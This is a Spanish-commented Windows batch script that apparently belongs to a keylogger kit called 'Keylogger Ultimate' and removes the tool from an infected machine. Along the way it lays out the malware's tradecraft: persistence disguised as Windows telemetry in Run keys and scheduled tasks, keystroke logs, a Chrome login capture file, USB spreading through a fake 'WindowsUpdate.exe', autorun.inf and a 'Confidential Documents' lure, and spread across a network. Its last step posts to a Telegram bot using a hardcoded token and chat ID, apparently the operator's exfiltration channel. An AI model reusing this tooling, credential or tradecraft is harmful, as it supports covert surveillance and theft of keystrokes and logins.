@echo off
chcp 65001 >nul
title Desinstalador Definitivo Keylogger Ultimate
color 0C

cd /d "%~dp0"

echo ================================================
echo     💀 DESINSTALADOR DEFINITIVO - FULL CLEAN
echo ================================================
echo.

:: Verificar administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Debe ejecutar como ADMINISTRADOR
    echo.
    pause
    exit /b 1
)

echo [1/8] Matando TODOS los procesos Python activos...
taskkill /F /IM python.exe >nul 2>&1
taskkill /F /IM pythonw.exe >nul 2>&1
wmic process where "name like '%%python%%'" delete >nul 2>&1
taskkill /F /IM py.exe >nul 2>&1
taskkill /F /IM pylauncher.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: Verificar procesos residuales
tasklist | findstr /i "python" > %temp%\python_tasks.txt
if %errorlevel% equ 0 (
    echo [⚠] Aun hay procesos Python, usando metodo extremo...
    for /f "tokens=2" %%p in ('tasklist ^| findstr /i "python"') do (
        taskkill /F /PID %%p >nul 2>&1
    )
)
del %temp%\python_tasks.txt 2>nul
echo [✓] Procesos Python eliminados

echo [2/8] Eliminando persistencia mediante el script...
:: Ejecutar el propio script con --uninstall (limpia registro, tareas, WMI, Startup)
if exist "keylogger_ultimate.py" (
    python keylogger_ultimate.py --uninstall >nul 2>&1
    echo [✓] Persistencia eliminada via script
) else (
    echo [⚠] keylogger_ultimate.py no encontrado, se limpiará manualmente
)

echo [3/8] Eliminando entradas del registro (por si quedan)...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryUltimate" /f >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryUltimate" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryService" /f >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryService" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Keylogger" /f >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Keylogger" /f >nul 2>&1
echo [✓] Registro limpiado

echo [4/8] Eliminando tareas programadas...
schtasks /delete /tn "WindowsTelemetryUltimate" /f >nul 2>&1
schtasks /delete /tn "WindowsTelemetryTask" /f >nul 2>&1
schtasks /delete /tn "WindowsTelemetryService" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\Telemetry\Keylogger" /f >nul 2>&1
echo [✓] Tareas programadas eliminadas

echo [5/8] Eliminando archivos y carpetas del sistema...
:: Carpeta oculta principal
rmdir /s /q "%APPDATA%\Microsoft\Telemetry" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\Microsoft\Telemetry" >nul 2>&1

:: Archivos en carpeta Startup
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemHelper.lnk" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\windows_telemetry.bat" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\windows_service.py" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*.py" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*.bat" >nul 2>&1

:: Archivos en directorio actual
del /f /q keylogger_ultimate.py >nul 2>&1
del /f /q keylogger_*.py >nul 2>&1
del /f /q config.json >nul 2>&1
del /f /q *.pyc >nul 2>&1
rmdir /s /q __pycache__ >nul 2>&1
echo [✓] Archivos del sistema eliminados

echo [6/8] Eliminando logs y archivos temporales...
del /f /q keylog_*.txt >nul 2>&1
del /f /q "%TEMP%\keylog_*.txt" >nul 2>&1
del /f /q "%USERPROFILE%\keylog_*.txt" >nul 2>&1
del /f /q "%TEMP%\chrome_login_temp" >nul 2>&1
del /f /q "%TEMP%\temp.vbs" >nul 2>&1
del /f /q "%TEMP%\link.vbs" >nul 2>&1
echo [✓] Logs y temporales eliminados

echo [7/8] Intentando eliminar copias en unidades USB...
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\WindowsUpdate.exe" (
        del /f /q "%%d:\WindowsUpdate.exe" >nul 2>&1
        attrib -h -s "%%d:\WindowsUpdate.exe" >nul 2>&1
        del /f /q "%%d:\WindowsUpdate.exe" >nul 2>&1
    )
    if exist "%%d:\Confidential Documents.lnk" (
        del /f /q "%%d:\Confidential Documents.lnk" >nul 2>&1
    )
    if exist "%%d:\autorun.inf" (
        del /f /q "%%d:\autorun.inf" >nul 2>&1
    )
)
echo [✓] Copias en USB eliminadas (si existian)

echo [8/8] Enviando notificacion final a Telegram...
:: Intentar usar el script si existe
if exist "keylogger_ultimate.py" (
    python -c "import requests; TOKEN='8325410653:AAEfaBwelXzUZub0tUlPSjg4MAx-WqGvd1w'; CHAT_ID='1490959763'; requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data={'chat_id': CHAT_ID, 'text': '🛑 Keylogger Ultimate desinstalado del sistema - LIMPIEZA COMPLETA'})" >nul 2>&1
) else (
    python -c "import requests; TOKEN='8325410653:AAEfaBwelXzUZub0tUlPSjg4MAx-WqGvd1w'; CHAT_ID='1490959763'; requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data={'chat_id': CHAT_ID, 'text': '🛑 Keylogger Ultimate desinstalado del sistema - LIMPIEZA COMPLETA'})" >nul 2>&1
)
echo [✓] Notificacion enviada (si la conexion y Python lo permiten)

echo.
echo ================================================
echo ✅ DESINSTALACION COMPLETADA - SISTEMA LIMPIO
echo ================================================
echo.
echo Todos los procesos Python han sido terminados.
echo Persistencia, archivos y copias eliminados.
echo El keylogger ya NO deberia estar en ejecucion.
echo.
echo ⚠️  Si el keylogger estaba propagado a otros PCs de la red,
echo    deberas ejecutar este mismo desinstalador en cada uno.
echo.
pause